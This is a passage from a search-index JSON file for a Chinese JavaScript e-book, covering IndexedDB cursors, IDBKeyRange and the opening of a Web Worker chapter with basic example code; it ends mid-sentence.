<li><code>IDBCursor.source</code>\uff1a\u8fd4\u56de\u6b63\u5728\u904d\u5386\u7684\u5bf9\u8c61\u4ed3\u5e93\u6216\u7d22\u5f15\u3002</li> <li><code>IDBCursor.direction</code>\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6307\u9488\u904d\u5386\u7684\u65b9\u5411\u3002\u5171\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\uff1anext\uff08\u4ece\u5934\u5f00\u59cb\u5411\u540e\u904d\u5386\uff09\u3001nextunique\uff08\u4ece\u5934\u5f00\u59cb\u5411\u540e\u904d\u5386\uff0c\u91cd\u590d\u7684\u503c\u53ea\u904d\u5386\u4e00\u6b21\uff09\u3001prev\uff08\u4ece\u5c3e\u90e8\u5f00\u59cb\u5411\u524d\u904d\u5386\uff09\u3001prevunique\uff08\u4ece\u5c3e\u90e8\u5f00\u59cb\u5411\u524d\u904d\u5386\uff0c\u91cd\u590d\u7684\u503c\u53ea\u904d\u5386\u4e00\u6b21\uff09\u3002\u8be5\u5c5e\u6027\u901a\u8fc7<code>IDBObjectStore.openCursor()</code>\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\uff0c\u4e00\u65e6\u6307\u5b9a\u5c31\u4e0d\u80fd\u6539\u53d8\u4e86\u3002</li> <li><code>IDBCursor.key</code>\uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u4e3b\u952e\u3002</li> <li><code>IDBCursor.value</code>\uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u6570\u636e\u503c\u3002</li> <li>IDBCursor.primaryKey\uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u4e3b\u952e\u3002\u5bf9\u4e8e\u6570\u636e\u4ed3\u5e93\uff08objectStore\uff09\u6765\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7b49\u540c\u4e8e IDBCursor.key\uff1b\u5bf9\u4e8e\u7d22\u5f15\uff0cIDBCursor.key \u8fd4\u56de\u7d22\u5f15\u7684\u4f4d\u7f6e\u503c\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u3002</li> </ul> <p>IDBCursor \u5bf9\u8c61\u6709\u5982\u4e0b\u65b9\u6cd5\u3002</p> <ul> <li><code>IDBCursor.advance(n)</code>\uff1a\u6307\u9488\u5411\u524d\u79fb\u52a8 n \u4e2a\u4f4d\u7f6e\u3002</li> <li><code>IDBCursor.continue()</code>\uff1a\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u4e3b\u952e\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd9\u65f6\u4f1a\u8df3\u8f6c\u5230\u8fd9\u4e2a\u4e3b\u952e\u3002</li> <li><code>IDBCursor.continuePrimaryKey()</code>\uff1a\u8be5\u65b9\u6cd5\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f<code>key</code>\uff0c\u7b2c\u4e8c\u4e2a\u662f<code>primaryKey</code>\uff0c\u5c06\u6307\u9488\u79fb\u5230\u7b26\u5408\u8fd9\u4e24\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002</li> <li><code>IDBCursor.delete()</code>\uff1a\u7528\u6765\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u7684\u8bb0\u5f55\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u6539\u53d8\u6307\u9488\u7684\u4f4d\u7f6e\u3002</li> <li><code>IDBCursor.update()</code>\uff1a\u7528\u6765\u66f4\u65b0\u5f53\u524d\u4f4d\u7f6e\u7684\u8bb0\u5f55\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u5b83\u7684\u53c2\u6570\u662f\u8981\u5199\u5165\u6570\u636e\u5e93\u7684\u65b0\u7684\u503c\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idbkeyrange","title":"IDBKeyRange \u5bf9\u8c61","text":"<p>IDBKeyRange \u5bf9\u8c61\u4ee3\u8868\u6570\u636e\u4ed3\u5e93\uff08object store\uff09\u91cc\u9762\u7684\u4e00\u7ec4\u4e3b\u952e\u3002\u6839\u636e\u8fd9\u7ec4\u4e3b\u952e\uff0c\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u4ed3\u5e93\u6216\u7d22\u5f15\u91cc\u9762\u7684\u4e00\u7ec4\u8bb0\u5f55\u3002</p> <p>IDBKeyRange \u53ef\u4ee5\u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e0a\u9650\u548c\u4e0b\u9650\u3002\u5b83\u6709\u56db\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u6765\u6307\u5b9a\u4e3b\u952e\u7684\u8303\u56f4\u3002</p> <ul> <li><code>IDBKeyRange.lowerBound()</code>\uff1a\u6307\u5b9a\u4e0b\u9650\u3002</li> <li><code>IDBKeyRange.upperBound()</code>\uff1a\u6307\u5b9a\u4e0a\u9650\u3002</li> <li><code>IDBKeyRange.bound()</code>\uff1a\u540c\u65f6\u6307\u5b9a\u4e0a\u4e0b\u9650\u3002</li> <li><code>IDBKeyRange.only()</code>\uff1a\u6307\u5b9a\u53ea\u5305\u542b\u4e00\u4e2a\u503c\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u4ee3\u7801\u5b9e\u4f8b\u3002</p> <pre><code>// All keys \u2264 x\nvar r1 = IDBKeyRange.upperBound(x);\n\n// All keys &lt; x\nvar r2 = IDBKeyRange.upperBound(x, true);\n\n// All keys \u2265 y\nvar r3 = IDBKeyRange.lowerBound(y);\n\n// All keys &gt; y\nvar r4 = IDBKeyRange.lowerBound(y, true);\n\n// All keys \u2265 x &amp;&amp; \u2264 y\nvar r5 = IDBKeyRange.bound(x, y);\n\n// All keys &gt; x &amp;&amp;&lt; y\nvar r6 = IDBKeyRange.bound(x, y, true, true);\n\n// All keys &gt; x &amp;&amp; \u2264 y\nvar r7 = IDBKeyRange.bound(x, y, true, false);\n\n// All keys \u2265 x &amp;&amp;&lt; y\nvar r8 = IDBKeyRange.bound(x, y, false, true);\n\n// The key = z\nvar r9 = IDBKeyRange.only(z);\n</code></pre> <p><code>IDBKeyRange.lowerBound()</code>\u3001<code>IDBKeyRange.upperBound()</code>\u3001<code>IDBKeyRange.bound()</code>\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u9ed8\u8ba4\u5305\u62ec\u7aef\u70b9\u503c\uff0c\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4fee\u6539\u8fd9\u4e2a\u5c5e\u6027\u3002</p> <p>\u4e0e\u4e4b\u5bf9\u5e94\uff0cIDBKeyRange \u5bf9\u8c61\u6709\u56db\u4e2a\u53ea\u8bfb\u5c5e\u6027\u3002</p> <ul> <li><code>IDBKeyRange.lower</code>\uff1a\u8fd4\u56de\u4e0b\u9650</li> <li><code>IDBKeyRange.lowerOpen</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e0b\u9650\u662f\u5426\u4e3a\u5f00\u533a\u95f4\uff08\u5373\u4e0b\u9650\u662f\u5426\u6392\u9664\u5728\u8303\u56f4\u4e4b\u5916\uff09</li> <li><code>IDBKeyRange.upper</code>\uff1a\u8fd4\u56de\u4e0a\u9650</li> <li><code>IDBKeyRange.upperOpen</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e0a\u9650\u662f\u5426\u4e3a\u5f00\u533a\u95f4\uff08\u5373\u4e0a\u9650\u662f\u5426\u6392\u9664\u5728\u8303\u56f4\u4e4b\u5916\uff09</li> </ul> <p>IDBKeyRange \u5b9e\u4f8b\u5bf9\u8c61\u751f\u6210\u4ee5\u540e\uff0c\u5c06\u5b83\u4f5c\u4e3a\u53c2\u6570\u8f93\u5165 IDBObjectStore \u6216 IDBIndex \u5bf9\u8c61\u7684<code>openCursor()</code>\u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5728\u6240\u8bbe\u5b9a\u7684\u8303\u56f4\u5185\u8bfb\u53d6\u6570\u636e\u3002</p> <pre><code>var t = db.transaction(['people'], 'readonly');\nvar store = t.objectStore('people');\nvar index = store.index('name');\n\nvar range = IDBKeyRange.bound('B', 'D');\n\nindex.openCursor(range).onsuccess = function (e) {\n  var cursor = e.target.result;\n  if (cursor) {\n    console.log(cursor.key + ':');\n\n    for (var field in cursor.value) {\n      console.log(cursor.value[field]);\n    }\n    cursor.continue();\n  }\n}\n</code></pre> <p>IDBKeyRange \u6709\u4e00\u4e2a\u5b9e\u4f8b\u65b9\u6cd5<code>includes(key)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u4e3b\u952e\u662f\u5426\u5305\u542b\u5728\u5f53\u524d\u8fd9\u4e2a\u4e3b\u952e\u7ec4\u4e4b\u5185\u3002</p> <pre><code>var keyRangeValue = IDBKeyRange.bound('A', 'K', false, false);\n\nkeyRangeValue.includes('F') // true\nkeyRangeValue.includes('W') // false\n</code></pre>"},{"location":"ebook-JS-basic/10-5-web-worker/","title":"10-5-web-worker","text":""},{"location":"ebook-JS-basic/10-5-web-worker/#bom","title":"\u7b2c\u5341\u7ae0 BOM","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 13292  \u9605\u8bfb27\u5206\u949f</p> <p>2021-11-24 2023-04-11 \u4e3b\u8981\u7528\u5728\u590d\u6742\u8ba1\u7b97\u4e0a\uff0c\u4f7f\u7528\u5de5\u4f5c\u7ebf\u7a0b\uff0c\u907f\u514d\u957f\u65f6\u95f4\u5360\u7528\u4e3b\u7ebf\u7a0b</p>"},{"location":"ebook-JS-basic/10-5-web-worker/#1015-web-worker","title":"10.15 Web worker","text":""},{"location":"ebook-JS-basic/10-5-web-worker/#_1","title":"\u6982\u8ff0","text":"<p>JavaScript \u8bed\u8a00\u91c7\u7528\u7684\u662f\u5355\u7ebf\u7a0b\u6a21\u578b\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6240\u6709\u4efb\u52a1\u53ea\u80fd\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u5b8c\u6210\uff0c\u4e00\u6b21\u53ea\u80fd\u505a\u4e00\u4ef6\u4e8b\u3002\u524d\u9762\u7684\u4efb\u52a1\u6ca1\u505a\u5b8c\uff0c\u540e\u9762\u7684\u4efb\u52a1\u53ea\u80fd\u7b49\u7740\u3002\u968f\u7740\u7535\u8111\u8ba1\u7b97\u80fd\u529b\u7684\u589e\u5f3a\uff0c\u5c24\u5176\u662f\u591a\u6838 CPU \u7684\u51fa\u73b0\uff0c\u5355\u7ebf\u7a0b\u5e26\u6765\u5f88\u5927\u7684\u4e0d\u4fbf\uff0c\u65e0\u6cd5\u5145\u5206\u53d1\u6325\u8ba1\u7b97\u673a\u7684\u8ba1\u7b97\u80fd\u529b\u3002</p> <p>Web Worker \u7684\u4f5c\u7528\uff0c\u5c31\u662f\u4e3a JavaScript \u521b\u9020\u591a\u7ebf\u7a0b\u73af\u5883\uff0c\u5141\u8bb8\u4e3b\u7ebf\u7a0b\u521b\u5efa Worker \u7ebf\u7a0b\uff0c\u5c06\u4e00\u4e9b\u4efb\u52a1\u5206\u914d\u7ed9\u540e\u8005\u8fd0\u884c\u3002\u5728\u4e3b\u7ebf\u7a0b\u8fd0\u884c\u7684\u540c\u65f6\uff0cWorker \u7ebf\u7a0b\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u4e24\u8005\u4e92\u4e0d\u5e72\u6270\u3002\u7b49\u5230 Worker \u7ebf\u7a0b\u5b8c\u6210\u8ba1\u7b97\u4efb\u52a1\uff0c\u518d\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u4e3b\u7ebf\u7a0b\u3002\u8fd9\u6837\u7684\u597d\u5904\u662f\uff0c\u4e00\u4e9b\u8ba1\u7b97\u5bc6\u96c6\u578b\u6216\u9ad8\u5ef6\u8fdf\u7684\u4efb\u52a1\u53ef\u4ee5\u4ea4\u7531 Worker \u7ebf\u7a0b\u6267\u884c\uff0c\u4e3b\u7ebf\u7a0b\uff08\u901a\u5e38\u8d1f\u8d23 UI \u4ea4\u4e92\uff09\u80fd\u591f\u4fdd\u6301\u6d41\u7545\uff0c\u4e0d\u4f1a\u88ab\u963b\u585e\u6216\u62d6\u6162\u3002</p> <p>Worker \u7ebf\u7a0b\u4e00\u65e6\u65b0\u5efa\u6210\u529f\uff0c\u5c31\u4f1a\u59cb\u7ec8\u8fd0\u884c\uff0c\u4e0d\u4f1a\u88ab\u4e3b\u7ebf\u7a0b\u4e0a\u7684\u6d3b\u52a8\uff08\u6bd4\u5982\u7528\u6237\u70b9\u51fb\u6309\u94ae\u3001\u63d0\u4ea4\u8868\u5355\uff09\u6253\u65ad\u3002\u8fd9\u6837\u6709\u5229\u4e8e\u968f\u65f6\u54cd\u5e94\u4e3b\u7ebf\u7a0b\u7684\u901a\u4fe1\u3002\u4f46\u662f\uff0c\u8fd9\u4e5f\u9020\u6210\u4e86 Worker \u6bd4\u8f83\u8017\u8d39\u8d44\u6e90\uff0c\u4e0d\u5e94\u8be5\u8fc7\u5ea6\u4f7f\u7528\uff0c\u800c\u4e14\u4e00\u65e6\u4f7f\u7528\u5b8c\u6bd5\uff0c\u5c31\u5e94\u8be5\u5173\u95ed\u3002</p> <p>Web Worker \u6709\u4ee5\u4e0b\u51e0\u4e2a\u4f7f\u7528\u6ce8\u610f\u70b9\u3002</p> <p>\uff081\uff09\u540c\u6e90\u9650\u5236</p> <p>\u5206\u914d\u7ed9 Worker \u7ebf\u7a0b\u8fd0\u884c\u7684\u811a\u672c\u6587\u4ef6\uff0c\u5fc5\u987b\u4e0e\u4e3b\u7ebf\u7a0b\u7684\u811a\u672c\u6587\u4ef6\u540c\u6e90\u3002</p> <p>\uff082\uff09DOM \u9650\u5236</p> <p>Worker \u7ebf\u7a0b\u6240\u5728\u7684\u5168\u5c40\u5bf9\u8c61\uff0c\u4e0e\u4e3b\u7ebf\u7a0b\u4e0d\u4e00\u6837\uff0c\u65e0\u6cd5\u8bfb\u53d6\u4e3b\u7ebf\u7a0b\u6240\u5728\u7f51\u9875\u7684 DOM \u5bf9\u8c61\uff0c\u4e5f\u65e0\u6cd5\u4f7f\u7528<code>document</code>\u3001<code>window</code>\u3001<code>parent</code>\u8fd9\u4e9b\u5bf9\u8c61\u3002\u4f46\u662f\uff0cWorker \u7ebf\u7a0b\u53ef\u4ee5\u4f7f\u7528<code>navigator</code>\u5bf9\u8c61\u548c<code>location</code>\u5bf9\u8c61\u3002</p> <p>\uff083\uff09\u5168\u5c40\u5bf9\u8c61\u9650\u5236</p> <p>Worker \u7684\u5168\u5c40\u5bf9\u8c61<code>WorkerGlobalScope</code>\uff0c\u4e0d\u540c\u4e8e\u7f51\u9875\u7684\u5168\u5c40\u5bf9\u8c61<code>Window</code>\uff0c\u5f88\u591a\u63a5\u53e3\u62ff\u4e0d\u5230\u3002\u6bd4\u5982\uff0c\u7406\u8bba\u4e0a Worker \u7ebf\u7a0b\u4e0d\u80fd\u4f7f\u7528<code>console.log</code>\uff0c\u56e0\u4e3a\u6807\u51c6\u91cc\u9762\u6ca1\u6709\u63d0\u5230 Worker \u7684\u5168\u5c40\u5bf9\u8c61\u5b58\u5728<code>console</code>\u63a5\u53e3\uff0c\u53ea\u5b9a\u4e49\u4e86<code>Navigator</code>\u63a5\u53e3\u548c<code>Location</code>\u63a5\u53e3\u3002\u4e0d\u8fc7\uff0c\u6d4f\u89c8\u5668\u5b9e\u9645\u4e0a\u652f\u6301 Worker \u7ebf\u7a0b\u4f7f\u7528<code>console.log</code>\uff0c\u4fdd\u9669\u7684\u505a\u6cd5\u8fd8\u662f\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002</p> <p>\uff084\uff09\u901a\u4fe1\u8054\u7cfb</p> <p>Worker \u7ebf\u7a0b\u548c\u4e3b\u7ebf\u7a0b\u4e0d\u5728\u540c\u4e00\u4e2a\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u5b83\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u4fe1\uff0c\u5fc5\u987b\u901a\u8fc7\u6d88\u606f\u5b8c\u6210\u3002</p> <p>\uff085\uff09\u811a\u672c\u9650\u5236</p> <p>Worker \u7ebf\u7a0b\u4e0d\u80fd\u6267\u884c<code>alert()</code>\u65b9\u6cd5\u548c<code>confirm()</code>\u65b9\u6cd5\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u53d1\u51fa AJAX \u8bf7\u6c42\u3002</p> <p>\uff086\uff09\u6587\u4ef6\u9650\u5236</p> <p>Worker \u7ebf\u7a0b\u65e0\u6cd5\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u5373\u4e0d\u80fd\u6253\u5f00\u672c\u673a\u7684\u6587\u4ef6\u7cfb\u7edf\uff08<code>file://</code>\uff09\uff0c\u5b83\u6240\u52a0\u8f7d\u7684\u811a\u672c\uff0c\u5fc5\u987b\u6765\u81ea\u7f51\u7edc\u3002</p>"},{"location":"ebook-JS-basic/10-5-web-worker/#_2","title":"\u57fa\u672c\u7528\u6cd5","text":""},{"location":"ebook-JS-basic/10-5-web-worker/#_3","title":"\u4e3b\u7ebf\u7a0b","text":"<p>\u4e3b\u7ebf\u7a0b\u91c7\u7528<code>new</code>\u547d\u4ee4\uff0c\u8c03\u7528<code>Worker()</code>\u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u4e00\u4e2a Worker \u7ebf\u7a0b\u3002</p> <pre><code>var worker = new Worker('work.js');\n// \u6784\u9020\u51fd\u6570\u662f\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\u3002\u56e0\u4e3aworkder \u4e0d\u80fd\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6587\u4ef6\u5fc5\u987b\u6765\u6e90\u4e8e\u7f51\u7edc\u5e76\u4e0b\u8f7d\u597d\u3002\u5982\u679c\u6ca1\u6709\u4e0b\u8f7d\uff0cworker\u5c31\u4f1a\u5931\u8d25\n</code></pre> <p>\u7136\u540e\uff0c\u4e3b\u7ebf\u7a0b\u8c03\u7528<code>worker.postMessage()</code>\u65b9\u6cd5\uff0c\u5411 Worker \u53d1\u6d88\u606f\u3002</p> <pre><code>worker.postMessage('Hello World');\nworker.postMessage({method: 'echo', args: ['Work']});\n</code></pre> <p><code>worker.postMessage()</code>\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u5c31\u662f\u4e3b\u7ebf\u7a0b\u4f20\u7ed9 Worker \u7684\u6570\u636e\u3002\u5b83\u53ef\u4ee5\u662f\u5404\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u5305\u62ec\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u63a5\u7740\uff0c\u4e3b\u7ebf\u7a0b\u901a\u8fc7<code>worker.onmessage</code>\u6307\u5b9a\u76d1\u542c\u51fd\u6570\uff0c\u63a5\u6536\u5b50\u7ebf\u7a0b\u53d1\u56de\u6765\u7684\u6d88\u606f\u3002</p> <pre><code>worker.onmessage = function (event) {\n  worker.postMessage('Work done!');\n  console.log(event.data);\n}\n// Worker \u5b8c\u6210\u4efb\u52a1\u4ee5\u540e\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u53ef\u4ee5\u628a\u5b83\u5173\u6389\u3002\nworker.terminate();\n</code></pre>"},{"location":"ebook-JS-basic/10-5-web-worker/#worker","title":"Worker \u7ebf\u7a0b","text":"<p>Worker \u7ebf\u7a0b\u5185\u90e8\u9700\u8981\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u76d1\u542c<code>message</code>\u4e8b\u4ef6\u3002</p> <pre><code>self.addEventListener('message', function (e) {\n  self.postMessage('You said: ' + e.data);\n}, false);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>self</code>\u4ee3\u8868\u5b50\u7ebf\u7a0b\u81ea\u8eab\uff0c\u5373\u5b50\u7ebf\u7a0b\u7684\u5168\u5c40\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u7b49\u540c\u4e8e\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u3002</p> <pre><code>// \u5199\u6cd5\u4e00\nthis.addEventListener('message', function (e) {\n  this.postMessage('You said: ' + e.data);\n}, false);\n\n// \u5199\u6cd5\u4e8c\naddEventListener('message', function (e) {\n  postMessage('You said: ' + e.data);\n}, false);\n</code></pre> <p>\u9664\u4e86\u4f7f\u7528<code>self.addEventListener()</code>\u6307\u5b9a\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>self.onmessage</code>\u6307\u5b9a\u3002\u76d1\u542c\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5b83\u7684<code>data</code>\u5c5e\u6027\u5305\u542b\u4e3b\u7ebf\u7a0b\u53d1\u6765\u7684\u6570\u636e\u3002<code>self.postMessage()</code>\u65b9\u6cd5\u7528\u6765\u5411\u4e3b\u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002</p> <p>\u6839\u636e\u4e3b\u7ebf\u7a0b\u53d1\u6765\u7684\u6570\u636e\uff0cWorker \u7ebf\u7a0b\u53ef\u4ee5\u8c03\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>self.addEventListener('message', function (e) {\n  var data = e.data;\n  switch (data.cmd) {\n    case 'start':\n      self.postMessage('WORKER STARTED: ' + data.msg);\n      break;\n    case 'stop':\n      self.postMessage('WORKER STOPPED: ' + data.msg);\n      self.close(); // Terminates the worker.\n      break;\n    default:\n      self.postMessage('Unknown command: ' + data.msg);\n  };\n}, false);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>self.close()</code>\u7528\u4e8e\u5728 Worker \u5185\u90e8\u5173\u95ed\u81ea\u8eab\u3002</p>"},{"location":"ebook-JS-basic/10-5-web-worker/#worker_1","title":"Worker \u52a0\u8f7d\u811a\u672c","text":"<p>Worker \u5185\u90e8\u5982\u679c\u8981\u52a0\u8f7d\u5176\u4ed6\u811a\u672c\uff0c\u6709\u4e00\u4e2a\u4e13\u95e8\u7684\u65b9\u6cd5<code>importScripts()</code>\u3002</p> <pre><code>importScripts('script1.js');\n</code></pre> <p>\u8be5\u65b9\u6cd5\u53ef\u4ee5\u540c\u65f6\u52a0\u8f7d\u591a\u4e2a\u811a\u672c\u3002</p> <pre><code>importScripts('script1.js', 'script2.js');\n</code></pre>"},{"location":"ebook-JS-basic/10-5-web-worker/#_4","title":"\u9519\u8bef\u5904\u7406","text":"<p>\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u76d1\u542c Worker \u662f\u5426\u53d1\u751f\u9519\u8bef\u3002\u5982\u679c\u53d1\u751f\u9519\u8bef\uff0cWorker \u4f1a\u89e6\u53d1\u4e3b\u7ebf\u7a0b\u7684<code>error</code>\u4e8b\u4ef6\u3002</p> <pre><code>worker.onerror(function (event) {\n  console.log([\n    'ERROR: Line ', event.lineno, ' in ', event.filename, ': ', event.message\n  ].join(''));\n});\n\n// \u6216\u8005\nworker.addEventListener('error', function (event) {\n  // ...\n});\n</code></pre> <p>Worker \u5185\u90e8\u4e5f\u53ef\u4ee5\u76d1\u542c<code>error</code>\u4e8b\u4ef6\u3002</p>"},{"location":"ebook-JS-basic/10-5-web-worker/#worker_2","title":"\u5173\u95ed Worker","text":"<p>\u4f7f\u7528\u5b8c\u6bd5\uff0c\u4e3a\u4e86\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\uff0c\u5fc5\u987b\u5173\u95ed Worker\u3002</p> <pre><code>// \u4e3b\u7ebf\u7a0b\nworker.terminate();\n\n// Worker \u7ebf\u7a0b\nself.close();\n</code></pre>"},{"location":"ebook-JS-basic/10-5-web-worker/#_5","title":"\u6570\u636e\u901a\u4fe1","text":"<p>\u524d\u9762\u8bf4\u8fc7\uff0c\u4e3b\u7ebf\u7a0b\u4e0e Worker \u4e4b\u95f4\u7684\u901a\u4fe1\u5185\u5bb9\uff0c\u53ef\u4ee5\u662f\u6587\u672c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5bf9\u8c61\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u79cd\u901a\u4fe1\u662f\u62f7\u8d1d\u5173\u7cfb\uff0c\u5373\u662f\u4f20\u503c\u800c\u4e0d\u662f\u4f20\u5740\uff0cWorker \u5bf9\u901a\u4fe1\u5185\u5bb9\u7684\u4fee\u6539\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u4e3b\u7ebf\u7a0b\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6d4f\u89c8\u5668\u5185\u90e8\u7684\u8fd0\u884c\u673a\u5236\u662f\uff0c\u5148\u5c06\u901a\u4fe1\u5185\u5bb9\u4e32\u884c\u5316\uff0c\u7136\u540e\u628a\u4e32\u884c\u5316\u540e\u7684\u5b57\u7b26\u4e32\u53d1\u7ed9 Worker\uff0c\u540e\u8005\u518d\u5c06\u5b83\u8fd8\u539f\u3002</p> <p>\u4e3b\u7ebf\u7a0b\u4e0e Worker \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u4ea4\u6362\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982 File\u3001Blob\u3001ArrayBuffer \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5728\u7ebf\u7a0b\u4e4b\u95f4\u53d1\u9001\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>// \u4e3b\u7ebf\u7a0b\nvar uInt8Array = new Uint8Array(new ArrayBuffer(10));\nfor (var i = 0; i &lt; uInt8Array.length; ++i) {\n  uInt8Array[i] = i * 2; // [0, 2, 4, 6, 8,...]\n}\nworker.postMessage(uInt8Array);\n\n// Worker \u7ebf\u7a0b\nself.onmessage = function (e) {\n  var uInt8Array = e.data;\n  postMessage('Inside worker.js: uInt8Array.toString() = ' + uInt8Array.toString());\n  postMessage('Inside worker.js: uInt8Array.byteLength = ' + uInt8Array.byteLength);\n};\n</code></pre> <p>\u4f46\u662f\uff0c\u62f7\u8d1d\u65b9\u5f0f\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4f1a\u9020\u6210\u6027\u80fd\u95ee\u9898\u3002\u6bd4\u5982\uff0c\u4e3b\u7ebf\u7a0b\u5411 Worker \u53d1\u9001\u4e00\u4e2a 500MB \u6587\u4ef6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6d4f\u89c8\u5668\u4f1a\u751f\u6210\u4e00\u4e2a\u539f\u6587\u4ef6\u7684\u62f7\u8d1d\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cJavaScript \u5141\u8bb8\u4e3b\u7ebf\u7a0b\u628a\u4e8c\u8fdb\u5236\u6570\u636e\u76f4\u63a5\u8f6c\u79fb\u7ed9\u5b50\u7ebf\u7a0b\uff0c\u4f46\u662f\u4e00\u65e6\u8f6c\u79fb\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u65e0\u6cd5\u518d\u4f7f\u7528\u8fd9\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e\u4e86\uff0c\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u4fee\u6539\u6570\u636e\u7684\u9ebb\u70e6\u5c40\u9762\u3002\u8fd9\u79cd\u8f6c\u79fb\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u53eb\u505aTransferable Objects\u3002\u8fd9\u4f7f\u5f97\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u5feb\u901f\u628a\u6570\u636e\u4ea4\u7ed9 Worker\uff0c\u5bf9\u4e8e\u5f71\u50cf\u5904\u7406\u3001\u58f0\u97f3\u5904\u7406\u30013D \u8fd0\u7b97\u7b49\u5c31\u975e\u5e38\u65b9\u4fbf\u4e86\uff0c\u4e0d\u4f1a\u4ea7\u751f\u6027\u80fd\u8d1f\u62c5\u3002</p> <p>\u5982\u679c\u8981\u76f4\u63a5\u8f6c\u79fb\u6570\u636e\u7684\u63a7\u5236\u6743\uff0c\u5c31\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>// Transferable Objects \u683c\u5f0f\nworker.postMessage(arrayBuffer, [arrayBuffer]);\n\n// \u4f8b\u5b50\nvar ab = new ArrayBuffer(1);\nworker.postMessage(ab, [ab]);\n</code></pre>"},{"location":"ebook-JS-basic/10-5-web-worker/#web-worker","title":"\u540c\u9875\u9762\u7684 Web Worker","text":"<p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cWorker \u8f7d\u5165\u7684\u662f\u4e00\u4e2a\u5355\u72ec\u7684 JavaScript 